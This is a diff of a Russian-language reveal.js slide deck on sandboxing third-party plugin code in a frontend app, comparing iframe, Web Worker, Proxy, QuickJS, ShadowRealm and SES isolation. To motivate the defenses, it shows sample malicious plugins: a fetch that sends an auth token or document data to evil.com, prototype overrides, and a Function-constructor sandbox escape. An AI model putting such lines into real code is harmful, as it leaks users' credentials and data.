@@ -22,725 +22,1517 @@
 </head>
 
 <body>
-  <div class="reveal">
-    <div class="slides">
-      <section>
-        <h2>Не браузерные, а свои</h2>
-        <p>пишем собственную плагинную систему для фронтенд приложения</p>
-      </section>
-      
+    <div class="reveal">
+        <div class="slides">
+            
+            <!-- Титульный слайд -->
+            <section>
+                <h1 class="r-fit-text">Не браузерные, а свои</h1>
+                <p>пишем собственную плагинную систему для фронтенд приложения</p>
+            </section>
 
-      <!-- Проблема -->
-      <section class="center">
-        <h2>Проблема</h2>
-        <p class="emoji-big">🔌 💣</p>
-        <p>Как безопасно выполнять код плагинов,<br>не давая им доступ ко всему приложению?</p>
-      </section>
+            <!-- Вводная часть -->
+            <section>
+                <section>
+                    <h2>Зачем нужны плагины?</h2>
+                    <ul>
+                        <li>Каждый делает свою задачу</li>
+                        <li>Не мешают друг другу</li>
+                        <li>Расширяет функциональность</li>
+                    </ul>
+                </section>
+               <section>
+                <h2>Есть число</h2>
+                <img src="img/p1.png" alt="">
+               </section>
+               <section>
+                <h2>Контекстное меню</h2>
+                <img src="img/p2.png" alt="">
+               </section>
+               <section>
+                <h2>Получаем текст</h2>
+                <img src="img/p3.png" alt="">
+               </section>
+                <section>
+                    <h3>Главный вопрос</h3>
+                    <h2 style="color: #e74c3c;">Как запустить чужой код безопасно?</h2>
+                </section>
+            </section>
+               <section style="text-align: left;">
+                    <h2 style="text-align: center;">Выбор языка</h2>
+                    <p>&mdash; Какой язык?</p>
+                    <p>&mdash; Конечно JavaScript!</p>
+               </section>
 
-      <!-- Плагин пример -->
-      <section data-transition="none">
-        <h2>Плагин</h2>
-        <pre><code data-trim data-noescape>
-function startPlugin(api) {
-  console.log('Plugin started');
-}
+                <section>
+                    <h3>Проблема: Вредоносный код</h3>
+                    <pre><code class="javascript" data-trim>
+// Плагин крадёт токены
+const token = localStorage.getItem('auth_token');
+fetch('https://evil.com/steal?token=' + token);
 
-export default {
-    // Точка входа в плагин
-    onInit: startPlugin,
-}
-        </code></pre>
-      </section>
-      
-      <section data-transition="none">
-        <h2>Плагин</h2>
-        <pre><code data-trim data-noescape>
-async function update(api){
-  const old = await api
-                     .document
-                     .selection
-                     .getSelectionAsText();
+// Или ломает прототипы
+Array.prototype.push = function() {
+  console.log('Хакнуто! 😈');
+};
+                    </code></pre>
+                </section>
 
-  const new = numbers2words(old) // логика плагина
+            <section>
+              <h2>Методы изоляции</h2>
+              <ul>
+                <li class="fragment">iframe с атрибутом sandbox</li>
+                <li class="fragment">Web Workers</li>
+                <li class="fragment">SES (Hardened JavaScript)</li>
+                <li class="fragment">Shadow Realms (Realm API)</li>
+                <li class="fragment">Proxy-based изоляция</li>
+                <li class="fragment">QuickJS + WebAssembly</li>
+              </ul>
+            </section>
 
-  await api.document.insertContent(new);
-}
-        </code></pre>
-      </section>
-      
-      <section data-transition="none">
-        <h2>Плагин</h2>
-        <pre><code data-trim data-noescape>
-function startPlugin(api) {
-  api.ui.contextMenu.registerItems([{
-      title: 'Прописью',
-      onClick: update.call(this, api),
-  }]);
-}
-        </code></pre>
-      </section>
 
-      <!-- Что не так? -->
-      <section class="center">
-        <h2>Что может пойти не так?</h2>
-        <pre><code class="javascript" data-trim>
-// Плагин может украсть данные:
-fetch('https://evil.com/steal', {
-  method: 'POST',
-  body: JSON.stringify(api.document.getAll())
+
+
+<!-- iframe -->
+<section>
+  <section>
+    <h2>iframe с sandbox</h2>
+    <p>Изоляция в отдельном контексте браузера</p>
+    <pre><code data-trim data-noescape class="html">
+&lt;iframe sandbox="allow-scripts"
+        src="plugin.html"&gt;
+&lt;/iframe&gt;
+    </code></pre>
+  </section>
+  
+  <section>
+    <h3>Плюсы iframe</h3>
+    <ul>
+      <li class="fragment">Сильная изоляция DOM и выполнения</li>
+      <li class="fragment">Гранулярный контроль разрешений</li>
+      <li class="fragment">Поддержка всеми браузерами</li>
+      <li class="fragment">Синхронное взаимодействие через contentWindow</li>
+    </ul>
+  </section>
+  
+  <section>
+    <h3>Минусы iframe</h3>
+    <ul>
+      <li class="fragment">Бесконечный цикл замораживает приложение</li>
+      <li class="fragment">Накладные расходы на создание контекста</li>
+      <li class="fragment">Проблемы с OOPIF</li>
+      <li class="fragment">allow-scripts + allow-same-origin = риск</li>
+    </ul>
+  </section>
+  <section>
+    <p>OOPIF — это когда браузер запускает iframe в отдельном процессе операционной системы, а не в том же процессе, что и основная страница</p>
+  </section>
+  <section>
+    <h2>До OOPIF</h2>
+    <pre><code data-trim>
+// Синхронный вызов
+iframe.contentWindow.runPlugin();
+const result = iframe.contentWindow.getData(); // Сразу получаем
+    </code></pre>
+    <h2>После OOPIF</h2>
+    <pre><code data-trim>
+// Теперь это работает как Web Worker
+iframe.contentWindow.postMessage('runPlugin');
+
+// Ждём ответа асинхронно
+window.addEventListener('message', (e) => {
+  const result = e.data; // Получаем позже
 });
+    </code></pre>
+  </section>
+  <section>
+    <h2>Роль allow-scripts и allow-same-origin</h2>
+    <ul style="font-size: 0.8em;">
+      <li><strong>allow-scripts</strong> разрешает выполнение JavaScript внутри iframe</li>
+      <li><strong>allow-same-origin</strong> позволяет iframe иметь то же происхождение, что и родительская страница</li>
+    </ul>
+  </section>
+  <section>
+    <h2>Почему вместе это опасно?</h2>
+    <p>Совместное использование этих атрибутов снимает ограничения sandbox и даёт iframe доступ к родительским cookies и DOM.</p>
+  </section>
+</section>
 
-// Или сломать приложение:
-Array.prototype.push = () => { throw new Error('💀'); };
-
-// Или обойти любую защиту:
-(function(){}).constructor('return this')().document;
-        </code></pre>
-      </section>
-
-      <!-- Подходы -->
-      <section data-background="#1a1a2e">
-        <h2 class="center">1. Существующие подходы</h2>
-      </section>
-
-      <section>
-        <h3>Web Workers</h3>
-        <pre><code class="javascript" data-trim>
+<!-- Web Workers -->
+<section>
+  <section>
+    <h2>Web Workers</h2>
+    <p>Изоляция в отдельном потоке</p>
+    <pre><code data-trim data-noescape class="javascript">
 const worker = new Worker('plugin.js');
-worker.postMessage({ command: 'process', data: text });
-worker.onmessage = (e) => console.log(e.data);
-        </code></pre>
-        <p class="pros">✓ Изоляция потоков</p>
-        <p class="pros">✓ Безопасный обмен сообщениями</p>
-        <p class="cons">✗ Нет доступа к DOM</p>
-        <p class="cons">✗ Сложная коммуникация</p>
-        <p class="cons">✗ Ограничения браузера</p>
-      </section>
 
-      <section>
-        <h3>Iframe Sandbox</h3>
-        <pre><code class="html" data-trim>
-<iframe sandbox="allow-scripts" src="plugin.html"></iframe>
-        </code></pre>
-        <p class="pros">✓ Сильная изоляция</p>
-        <p class="pros">✓ Контроль разрешений</p>
-        <p class="cons">✗ Тяжеловесное решение</p>
-        <p class="cons">✗ Сложный API взаимодействия</p>
-        <p class="cons">✗ Проблемы с производительностью</p>
-      </section>
+worker.postMessage({ action: 'run' });
 
-      <section>
-        <h3>VM / vm2 (Node.js)</h3>
-        <pre><code class="javascript" data-trim>
-const { VM } = require('vm2');
-const vm = new VM({ sandbox: { api } });
-vm.run('api.log("Hello")');
-        </code></pre>
-        <p class="pros">✓ Простой API</p>
-        <p class="cons">✗ Только для Node.js</p>
-        <p class="cons">✗ Уязвимости в прошлом</p>
-        <p class="cons">✗ Проект заброшен (2023)</p>
-      </section>
+worker.onmessage = (e) => {
+  console.log('Result:', e.data);
+};
+    </code></pre>
+  </section>
+  
+  <section>
+    <h3>Плюсы Web Workers</h3>
+    <ul>
+      <li class="fragment">Полная изоляция потока — не блокирует UI</li>
+      <li class="fragment">Нет доступа к DOM и window</li>
+      <li class="fragment">Бесконечный цикл не замораживает приложение</li>
+      <li class="fragment">Отличная производительность для вычислений</li>
+    </ul>
+  </section>
+  
+  <section>
+    <h3>Минусы Web Workers</h3>
+    <ul>
+      <li class="fragment">Только postMessage — ограниченный API</li>
+      <li class="fragment">Сложность создания удобного API</li>
+      <li class="fragment">Проблемы с прототипной инъекцией</li>
+      <li class="fragment">Асинхронная коммуникация</li>
+      <li class="fragment">Нет доступа к DOM</li>
+    </ul>
+  </section>
+</section>
 
-      <!-- Идеи, которые не понравились -->
-      <section data-background="#1a1a2e">
-        <h2 class="center">2. Идеи, которые не понравились</h2>
-      </section>
 
-      <section>
-        <h3>Proxy для глобальных объектов</h3>
-        <pre><code class="javascript" data-trim>
-const safeWindow = new Proxy(window, {
+
+<!-- Proxy -->
+<section>
+  <section>
+    <h2>Proxy-based изоляция</h2>
+    <p>Контроль доступа через Proxy</p>
+    <pre><code data-trim data-noescape class="javascript">
+const sandbox = new Proxy(globalThis, {
   get(target, prop) {
-    if (prop === 'fetch') return undefined;
+    if (prop === 'document') return undefined;
     return target[prop];
   }
 });
-        </code></pre>
-        <p class="cons">✗ Легко обойти через прототипы</p>
-        <p class="cons">✗ Не защищает от всех атак</p>
-        <p class="cons">✗ Производительность</p>
-      </section>
 
-      <section>
-        <h3>Статический анализ кода</h3>
-        <pre><code class="javascript" data-trim>
-function isSafe(code) {
-  return !code.includes('fetch') && 
-         !code.includes('eval') &&
-         !code.includes('Function');
+with (sandbox) {
+  // plugin code
 }
-        </code></pre>
-        <p class="cons">✗ Легко обойти обфускацией</p>
-        <p class="cons">✗ Много ложных срабатываний</p>
-        <p class="cons">✗ Невозможно предусмотреть всё</p>
-      </section>
+    </code></pre>
+  </section>
+  
+  <section>
+    <h3>Плюсы Proxy</h3>
+    <ul>
+      <li class="fragment">Лёгковесная реализация</li>
+      <li class="fragment">Гибкий контроль доступа</li>
+      <li class="fragment">Синхронное выполнение</li>
+      <li class="fragment">Выборочное ограничение API</li>
+    </ul>
+  </section>
+  
+  <section>
+    <h3>Минусы Proxy</h3>
+    <ul>
+      <li class="fragment">Слабая изоляция</li>
+      <li class="fragment">Легко обойти через constructor.prototype</li>
+      <li class="fragment">Не защищает от всех атак</li>
+      <li class="fragment">Требует тщательной реализации</li>
+      <li class="fragment">Не для недоверенного кода</li>
+    </ul>
+  </section>
+</section>
 
-      <section>
-        <h3>CSP (Content Security Policy)</h3>
-        <pre><code class="html" data-trim>
-<meta http-equiv="Content-Security-Policy" 
-      content="script-src 'self'">
-        </code></pre>
-        <p class="pros">✓ Защита от XSS</p>
-        <p class="cons">✗ Не защищает от prototype pollution</p>
-        <p class="cons">✗ Блокирует весь динамический код</p>
-        <p class="cons">✗ Слишком грубый инструмент для плагинов</p>
-      </section>
+<!-- QuickJS -->
+<section>
+  <section>
+    <h2>QuickJS + WebAssembly</h2>
+    <p>JS engine в WASM</p>
+    <pre><code data-trim data-noescape class="javascript">
+import { getQuickJS } from 'quickjs-emscripten';
 
-      <!-- Пишем сами -->
-      <section data-background="#1a1a2e">
-        <h2 class="center">3. Пишем сами: 4 фазы защиты</h2>
-      </section>
+const QuickJS = await getQuickJS();
+const vm = QuickJS.newContext();
 
-      <!-- Фаза 1 -->
-      <section>
-        <h2>Фаза 1: Базовый Lockdown</h2>
-        <h3>Проблема: Prototype Pollution</h3>
-        <p>Код может модифицировать встроенные прототипы и влиять на другой код</p>
-      </section>
+const result = vm.evalCode('1 + 1');
+console.log(vm.dump(result)); // 2
 
-      <section>
-        <h3>Атака через прототипы</h3>
-        <pre><code class="javascript" data-trim>
-// Атака ДО lockdown:
-Array.prototype.push = function() { 
-    console.log('💀 Hacked!'); 
-};
+result.dispose();
+vm.dispose();
+    </code></pre>
+  </section>
+  
+  <section>
+    <h3>Плюсы QuickJS</h3>
+    <ul>
+      <li class="fragment">Настоящая песочница на уровне движка</li>
+      <li class="fragment">Поддержка JavaScript и TypeScript</li>
+      <li class="fragment">Контролируемое API</li>
+      <li class="fragment">Виртуальная файловая система</li>
+      <li class="fragment">Ограничение памяти</li>
+    </ul>
+  </section>
+  
+  <section>
+    <h3>Минусы QuickJS</h3>
+    <ul>
+      <li class="fragment">Накладные расходы WASM</li>
+      <li class="fragment">Сложная передача объектов</li>
+      <li class="fragment">Web API не доступны из коробки</li>
+      <li class="fragment">Нужна настройка для DOM</li>
+      <li class="fragment">Увеличение размера бандла</li>
+    </ul>
+  </section>
+</section>
 
-[].push(1); // 💀 Hacked!
+<!-- Shadow Realms -->
+<section>
+  <section>
+    <h2>Shadow Realms</h2>
+    <p>Новый JavaScript realm (Stage 3 TC39)</p>
+    <pre><code data-trim data-noescape class="javascript">
+const realm = new ShadowRealm();
 
-// Все массивы в приложении теперь сломаны!
-const data = [];
-data.push(5); // 💀 Hacked!
-        </code></pre>
-      </section>
+realm.evaluate('globalThis.x = 1');
 
-      <section>
-        <h3>Решение: Заморозка прототипов</h3>
-        <pre><code class="javascript" data-trim>
-function lockdownPhase1() {
-    const intrinsics = [
-        Object.prototype,
-        Array.prototype,
-        Function.prototype,
-        String.prototype,
-        Number.prototype,
-        Boolean.prototype,
-        Promise.prototype,
-        RegExp.prototype,
-        Date.prototype,
-        Error.prototype,
-    ];
+const result = realm.evaluate('x + 1'); // 2
+    </code></pre>
+  </section>
+  
+  <section>
+    <h3>Плюсы Shadow Realms</h3>
+    <ul>
+      <li class="fragment">Отдельный глобальный объект и intrinsics</li>
+      <li class="fragment">Синхронное выполнение через evaluate()</li>
+      <li class="fragment">Контролируемый обмен значениями</li>
+      <li class="fragment">Меньше ресурсов чем Web Workers</li>
+      <li class="fragment">Предотвращает загрязнение глобального scope</li>
+    </ul>
+  </section>
+  
+  <section>
+    <h3>Минусы Shadow Realms</h3>
+    <ul>
+      <li class="fragment">Stage 3 proposal — ограниченная поддержка</li>
+      <li class="fragment">Мало документации</li>
+      <li class="fragment">Не все браузеры поддерживают</li>
+      <li class="fragment">Возможны проблемы совместимости</li>
+    </ul>
+  </section>
+</section>
 
-    intrinsics.forEach(proto => {
-        Object.freeze(proto);
-    });
-
-    console.log('✓ Фаза 1: Прототипы заморожены');
-}
-        </code></pre>
-      </section>
-
-      <section>
-        <h3>Результат Фазы 1</h3>
-        <pre><code class="javascript" data-trim>
-lockdownPhase1();
-
-// ПОСЛЕ lockdown атака не работает:
-try {
-    Array.prototype.push = function() { 
-        console.log('💀 Hacked!'); 
-    };
-} catch (e) {
-    console.log('✓ Атака заблокирована:', e.message);
-}
-
-[].push(1); // работает нормально
-        </code></pre>
-      </section>
-
-      <!-- Фаза 2 -->
-      <section>
-        <h2>Фаза 2: Harden</h2>
-        <h3>Проблема: Модификация объектов</h3>
-        <p>Даже если прототипы заморожены, сами объекты можно изменять</p>
-      </section>
-
-      <section>
-        <h3>Атака на объект</h3>
-        <pre><code class="javascript" data-trim>
-const counter = {
-    count: 0,
-    increment() { return ++this.count; }
-};
-
-console.log(counter.increment()); // 1
-
-// Атака - замена метода
-counter.increment = function() { 
-    console.log('💀 Взломан!'); 
-    return 999; 
-};
-
-console.log(counter.increment()); // 💀 Взломан! 999
-        </code></pre>
-      </section>
-
-      <section>
-        <h3>Решение: Глубокая заморозка</h3>
-        <pre><code class="javascript" data-trim>
-function harden(object) {
-    const visited = new WeakSet();
-
-    function hardenInternal(obj) {
-        if (obj === null || typeof obj !== 'object') return obj;
-        if (visited.has(obj)) return obj;
-        
-        visited.add(obj);
-
-        // Рекурсивно обрабатываем свойства
-        Object.getOwnPropertyNames(obj).forEach(name => {
-            const value = obj[name];
-            if (typeof value === 'object' && value !== null) {
-                hardenInternal(value);
-            }
-        });
-
-        // Обрабатываем прототип
-        const proto = Object.getPrototypeOf(obj);
-        if (proto !== null) {
-            hardenInternal(proto);
-        }
-
-        Object.freeze(obj);
-        return obj;
-    }
-
-    return hardenInternal(object);
-}
-        </code></pre>
-      </section>
-
-      <section>
-        <h3>Результат Фазы 2</h3>
-        <pre><code class="javascript" data-trim>
-const safeCounter = harden({
-    count: 0,
-    increment() { return ++this.count; }
-});
-
-console.log(safeCounter.increment()); // 1
-
-try {
-    safeCounter.increment = function() { 
-        console.log('💀 Взломан!'); 
-    };
-} catch (e) {
-    console.log('✓ Атака заблокирована');
-}
-
-// Объект остается неизменным
-        </code></pre>
-      </section>
-
-      <!-- Фаза 3 -->
-      <section>
-        <h2>Фаза 3: Защита конструкторов</h2>
-        <h3>Проблема: Обход через Constructor</h3>
-        <p>Через Function.prototype.constructor можно обойти изоляцию</p>
-      </section>
-
-      <section>
-        <h3>Атака через конструктор</h3>
-        <pre><code class="javascript" data-trim>
-// Получаем доступ к глобальному scope
-function escape() {
-    const GlobalEval = (function(){})
-        .constructor('return this')()
-        .eval;
-    return GlobalEval;
-}
-
-// Теперь можем выполнить любой код!
-const realEval = escape();
-realEval('console.log("Обход изоляции!")');
-        </code></pre>
-      </section>
-
-      <section>
-        <h3>Решение: Блокировка конструкторов</h3>
-        <pre><code class="javascript" data-trim>
-function lockdownPhase3() {
-    // Замораживаем прототипы
-    [Object.prototype, Array.prototype, 
-     Function.prototype, String.prototype]
-        .forEach(proto => Object.freeze(proto));
-
-    // Создаем безопасную обертку для Function
-    const OriginalFunction = Function;
-    const safeFunction = new Proxy(OriginalFunction, {
-        construct() {
-            throw new TypeError(
-                'Function() запрещен после lockdown'
-            );
-        },
-        apply() {
-            throw new TypeError(
-                'Function() запрещен после lockdown'
-            );
-        }
-    });
-
-    globalThis.Function = safeFunction;
-}
-        </code></pre>
-      </section>
-
-      <section>
-        <h3>Результат Фазы 3</h3>
-        <pre><code class="javascript" data-trim>
-lockdownPhase3();
-
-try {
-    const bad = (function(){})
-        .constructor('return this');
-    console.log('Обход не удался');
-} catch (e) {
-    console.log('✓ Обход заблокирован:', e.message);
-    // TypeError: Function() запрещен после lockdown
-}
-        </code></pre>
-      </section>
-
-      <!-- Фаза 4 -->
-      <section>
-        <h2>Фаза 4: Compartment</h2>
-        <h3>Проблема: Полная изоляция</h3>
-        <p>Нужна изоляция кода с контролем доступа к глобальным объектам</p>
-      </section>
-
-      <section>
-        <h3>Реализация Compartment</h3>
-        <pre><code class="javascript" data-trim>
-class Compartment {
-    constructor(endowments = {}) {
-        this.globalObject = Object.create(null);
-
-        const safeIntrinsics = {
-            Object, Array, String, Number,
-            Boolean, Math, JSON, Promise
-        };
-
-        Object.assign(this.globalObject, 
-                     safeIntrinsics, endowments);
-        Object.freeze(this.globalObject);
-    }
-
-    evaluate(code) {
-        const scopeProxy = new Proxy(this.globalObject, {
-            has() { return true; },
-            get(target, prop) {
-                if (prop === 'window' || 
-                    prop === 'document' || 
-                    prop === 'globalThis') {
-                    return undefined;
-                }
-                return target[prop];
-            }
-        });
-
-        const scopedEval = new Function('scope', 
-            'with (scope) { return eval(arguments[1]); }'
-        );
-
-        return scopedEval(scopeProxy, code);
-    }
-}
-        </code></pre>
-      </section>
-
-      <section>
-        <h3>Изоляция доступа</h3>
-        <pre><code class="javascript" data-trim>
-const compartment = new Compartment();
-
-// window недоступен
-const result = compartment.evaluate('typeof window');
-console.log(result); // "undefined"
-
-// document недоступен
-const result2 = compartment.evaluate('typeof document');
-console.log(result2); // "undefined"
-
-// fetch недоступен
-const result3 = compartment.evaluate('typeof fetch');
-console.log(result3); // "undefined"
-        </code></pre>
-      </section>
-
-      <section>
-        <h3>Изолированные контексты</h3>
-        <pre><code class="javascript" data-trim>
-// Каждый compartment изолирован
-const compartmentA = new Compartment({ 
-    name: 'Alice', 
-    secret: 'A123' 
-});
-
-const compartmentB = new Compartment({ 
-    name: 'Bob', 
-    secret: 'B456' 
-});
-
-console.log(
-    compartmentA.evaluate('name + ": " + secret')
-); // "Alice: A123"
-
-console.log(
-    compartmentB.evaluate('name + ": " + secret')
-); // "Bob: B456"
-        </code></pre>
-      </section>
-
-      <!-- Производительность -->
-      <section data-background="#1a1a2e">
-        <h2 class="center">4. Производительность</h2>
-      </section>
-
-      <section>
-        <h3>Накладные расходы</h3>
-        <ul>
-          <li><strong>Object.freeze()</strong> — ~0.1-1 мкс на объект</li>
-          <li><strong>Proxy обертки</strong> — 10-50% замедление обращений</li>
-          <li><strong>with + eval</strong> — 100-300% замедление выполнения</li>
-          <li><strong>Инициализация Compartment</strong> — 1-5 мс</li>
-        </ul>
-      </section>
-
-      <section>
-        <h3>Оптимизация</h3>
-        <pre><code class="javascript" data-trim>
-// ❌ Плохо: заморозка при каждом вызове
-function badAPI() {
-  return Object.freeze({ method() {} });
-}
-
-// ✓ Хорошо: заморозка один раз
-const goodAPI = Object.freeze({
-  method() {}
-});
-
-// ✓ Ещё лучше: переиспользование compartment
-const compartmentPool = new Map();
-function getCompartment(pluginId) {
-  if (!compartmentPool.has(pluginId)) {
-    compartmentPool.set(pluginId, new Compartment());
-  }
-  return compartmentPool.get(pluginId);
-}
-        </code></pre>
-      </section>
-
-      <section>
-        <h3>Бенчмарки (относительные)</h3>
-        <pre><code class="plaintext" data-trim>
-Метод                    | Скорость | Безопасность
--------------------------|----------|-------------
-Нативный JavaScript      | 1.0x     | ⚠️ Низкая
-Proxy изоляция           | 0.8x     | ⚠️ Средняя
-SES Compartment          | 0.3x     | ✓ Высокая
-Web Worker               | 0.1x     | ✓ Очень высокая
-Iframe Sandbox           | 0.05x    | ✓ Максимальная
-        </code></pre>
-        <p><small>* Скорость относительно нативного выполнения</small></p>
-      </section>
-
-      <!-- Стандарты -->
-      <section data-background="#1a1a2e">
-        <h2 class="center">5. Стандарты и экосистема</h2>
-      </section>
-
-      <section>
-        <h3>SES Proposal (TC39)</h3>
-        <ul>
-          <li><strong>Статус:</strong> Stage 2 в TC39</li>
-          <li><strong>Спонсоры:</strong> Agoric, MetaMask, Google</li>
-          <li><strong>Цель:</strong> Нативная поддержка в ECMAScript</li>
-        </ul>
-        <pre><code class="javascript" data-trim>
-// Будущий синтаксис:
-import { lockdown, Compartment } from 'ses';
+<!-- SES -->
+<section>
+  <section>
+    <h2>SES (Secure EcmaScript)</h2>
+    <p>Hardened JavaScript с замороженными intrinsics</p>
+    <pre style="font-size: 0.7em;"><code data-trim data-noescape class="javascript">
+import 'ses';
 
 lockdown();
-const c = new Compartment({ api });
-c.evaluate('api.doSomething()');
-        </code></pre>
-      </section>
 
-      <section>
-        <h3>Библиотеки и инструменты</h3>
-        <ul>
-          <li><strong>ses</strong> — референсная реализация (Agoric)</li>
-          <li><strong>@endo/ses-ava</strong> — тестирование с изоляцией</li>
-          <li><strong>LavaMoat</strong> — защита npm пакетов (MetaMask)</li>
-          <li><strong>Hardened JavaScript</strong> — экосистема безопасности</li>
-        </ul>
-        <pre><code class="bash" data-trim>
-npm install ses
-npm install lavamoat
-        </code></pre>
-      </section>
+const compartment = new Compartment({
+  console
+});
 
-      <section>
-        <h3>Кто использует SES?</h3>
-        <ul>
-          <li><strong>Agoric</strong> — блокчейн-платформа для смарт-контрактов</li>
-          <li><strong>MetaMask</strong> — изоляция расширений браузера</li>
-          <li><strong>Google</strong> — внутренние инструменты безопасности</li>
-          <li><strong>Salesforce</strong> — Locker Service для Lightning Web Components</li>
-        </ul>
-      </section>
+compartment.evaluate('console.log("Hello")');
+    </code></pre>
+  </section>
+  
+  <section>
+    <h3>Плюсы SES</h3>
+    <ul>
+      <li class="fragment">Защита от prototype pollution</li>
+      <li class="fragment">Compartments с собственным globalThis</li>
+      <li class="fragment">Синхронное выполнение</li>
+      <li class="fragment">Точный контроль доступных API</li>
+    </ul>
+  </section>
+  
+  <section>
+    <h3>Минусы SES</h3>
+    <ul>
+      <li class="fragment">Многие библиотеки не работают</li>
+      <li class="fragment">Сложная настройка</li>
+      <li class="fragment">Требует понимания hardened JS</li>
+      <li class="fragment">Ограниченная экосистема npm</li>
+    </ul>
+  </section>
+</section>
 
-      <section>
-        <h3>Ограничения стандарта</h3>
-        <ul>
-          <li>Нет нативной поддержки в браузерах (пока)</li>
-          <li>Требует полифилла (~50 КБ)</li>
-          <li>Не защищает от side-channel атак</li>
-          <li>Не заменяет CSP и другие механизмы</li>
-          <li>Ограничения производительности</li>
-        </ul>
-      </section>
+<!-- Сравнительная таблица -->
+<section>
+  <h2>Выбор метода</h2>
+  <table style="font-size: 0.7em;">
+    <thead>
+      <tr>
+        <th>Метод</th>
+        <th>Изоляция</th>
+        <th>Производительность</th>
+        <th>Сложность</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr class="fragment">
+        <td>iframe</td>
+        <td>Высокая</td>
+        <td>Средняя</td>
+        <td>Низкая</td>
+      </tr>
+      <tr class="fragment">
+        <td>Web Workers</td>
+        <td>Высокая</td>
+        <td>Высокая</td>
+        <td>Средняя</td>
+      </tr>
+      <tr class="fragment">
+        <td>SES</td>
+        <td>Средняя</td>
+        <td>Высокая</td>
+        <td>Высокая</td>
+      </tr>
+      <tr class="fragment">
+        <td>Shadow Realms</td>
+        <td>Высокая</td>
+        <td>Высокая</td>
+        <td>Низкая</td>
+      </tr>
+      <tr class="fragment">
+        <td>Proxy</td>
+        <td>Низкая</td>
+        <td>Высокая</td>
+        <td>Средняя</td>
+      </tr>
+      <tr class="fragment">
+        <td>QuickJS</td>
+        <td>Очень высокая</td>
+        <td>Средняя</td>
+        <td>Высокая</td>
+      </tr>
+    </tbody>
+  </table>
+</section>
 
-      <!-- Выводы -->
-      <section data-background="#1a1a2e">
-        <h2 class="center">6. Выводы</h2>
-      </section>
+<!-- Рекомендации -->
+<section>
+  <h2>Рекомендации</h2>
+  <ul style="font-size: 0.7em;">
+    <li class="fragment"><strong>UI-компоненты</strong> → iframe</li>
+    <li class="fragment"><strong>Вычисления</strong> → Web Workers</li>
+    <li class="fragment"><strong>Баланс DX и безопасность</strong> → SES/Shadow Realms</li>
+    <li class="fragment"><strong>Максимальная изоляция</strong> → QuickJS</li>
+    <li class="fragment"><strong>Простые случаи</strong> → Proxy (с осторожностью)</li>
+  </ul>
+</section>
+            <section>
+                <section>
+                    <h2>SES
+      <br>
+                    <small>Secure ECMAScript</small>
+    </h2>
+                    <p>Изоляция выполнения JavaScript</p>
+                </section>
 
-      <section>
-        <h2>Итоги: 4 фазы защиты</h2>
-        <ul>
-          <li><strong>Фаза 1: Lockdown</strong> — защита от prototype pollution</li>
-          <li><strong>Фаза 2: Harden</strong> — глубокая заморозка объектов</li>
-          <li><strong>Фаза 3: Защита конструкторов</strong> — закрытие escape hatches</li>
-          <li><strong>Фаза 4: Compartment</strong> — полная изоляция кода</li>
-        </ul>
-      </section>
+                <section>
+                    <h3>Что такое SES?</h3>
+                    <p><strong>&laquo;Песочница&raquo;</strong> для JavaScript</p>
+                    <br>
+                    <p>🏖️ Аналогия: детская песочница</p>
+                    <ul>
+                        <li>Ребёнок играет внутри</li>
+                        <li>Не может выйти за границы</li>
+                        <li>Не может испортить соседнюю площадку</li>
+                    </ul>
+                </section>
 
-      <section>
-        <h2>Когда использовать SES?</h2>
-        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 2rem;">
-          <div>
-            <h3 class="pros">✓ Подходит для:</h3>
-            <ul style="font-size: 0.8em;">
-              <li>Системы плагинов</li>
-              <li>Выполнение пользовательского кода</li>
-              <li>Изоляция сторонних библиотек</li>
-              <li>Смарт-контракты</li>
-              <li>Безопасные REPL</li>
-            </ul>
-          </div>
-          <div>
-            <h3 class="cons">✗ Не подходит для:</h3>
-            <ul style="font-size: 0.8em;">
-              <li>Высоконагруженных систем</li>
-              <li>Когда нужен полный доступ к DOM</li>
-              <li>Legacy кода с dynamic eval</li>
-              <li>Когда важна максимальная производительность</li>
-            </ul>
-          </div>
-        </div>
-      </section>
+                <section>
+                    <h3>Что делает SES</h3>
+                    <ol>
+                        <li>🔒 Замораживает встроенные объекты</li>
+                        <li>🚫 Убирает опасные глобальные API</li>
+                        <li>📦 Создаёт изолированные "компартменты"</li>
+                    </ol>
+                </section>
 
-      <section>
-        <h2>Главные преимущества</h2>
-        <ul>
-          <li class="pros">🛡️ <strong>Сильная изоляция</strong> — полный контроль над окружением</li>
-          <li class="pros">🔒 <strong>Immutable API</strong> — защита от модификации</li>
-          <li class="pros">🌐 <strong>Работает в браузере</strong> — не требует Node.js</li>
-          <li class="pros">📦 <strong>Легковесность</strong> — по сравнению с iframe/workers</li>
-          <li class="pros">🔮 <strong>Будущее стандарта</strong> — движется в TC39</li>
-        </ul>
-      </section>
+                <section>
+                    <h3>Проблема без SES</h3>
+                    <pre><code class="javascript" data-trim>
+// Вредоносный плагин меняет Array.prototype
+Array.prototype.push = function() { 
+  console.log('Хакнуто! 😈'); 
+  // Отправляем данные на сервер хакера
+};
 
-      <section>
-        <h2>Практические рекомендации</h2>
-        <ol>
-          <li><strong>Всегда вызывайте lockdown()</strong> перед загрузкой плагинов</li>
-          <li><strong>Используйте harden()</strong> для всех API объектов</li>
-          <li><strong>Переиспользуйте compartments</strong> для производительности</li>
-          <li><strong>Комбинируйте с CSP</strong> для защиты в глубину</li>
-          <li><strong>Тестируйте на реальных атаках</strong> — не полагайтесь только на теорию</li>
-        </ol>
-      </section>
+// Теперь ВСЕ массивы в приложении сломаны
+const items = [];
+items.push(1); // "Хакнуто! 😈"
+                    </code></pre>
+                </section>
 
-      <section>
-        <h2>Альтернативы в зависимости от случая</h2>
-        <table style="font-size: 0.7em;">
-          <tr>
-            <th>Сценарий</th>
-            <th>Рекомендация</th>
-          </tr>
-          <tr>
-            <td>Полная изоляция + DOM</td>
-            <td>Iframe Sandbox</td>
-          </tr>
-          <tr>
-            <td>Тяжёлые вычисления</td>
-            <td>Web Workers</td>
-          </tr>
-          <tr>
-            <td>Простые плагины</td>
-            <td>SES Compartment</td>
-          </tr>
-          <tr>
-            <td>Node.js окружение</td>
-            <td>Worker Threads + SES</td>
-          </tr>
-          <tr>
-            <td>Максимальная безопасность</td>
-            <td>Изолированный процесс</td>
-          </tr>
-        </table>
-      </section>
+                <section>
+                    <h3>Решение с SES</h3>
+                    <pre><code class="javascript" data-trim>
+import 'ses';
 
-      <!-- Заключительный слайд -->
-      <section class="center">
-        <h1>Спасибо за внимание!</h1>
-        <h3>SES: Secure ECMAScript</h3>
-        <p>
-          <small>
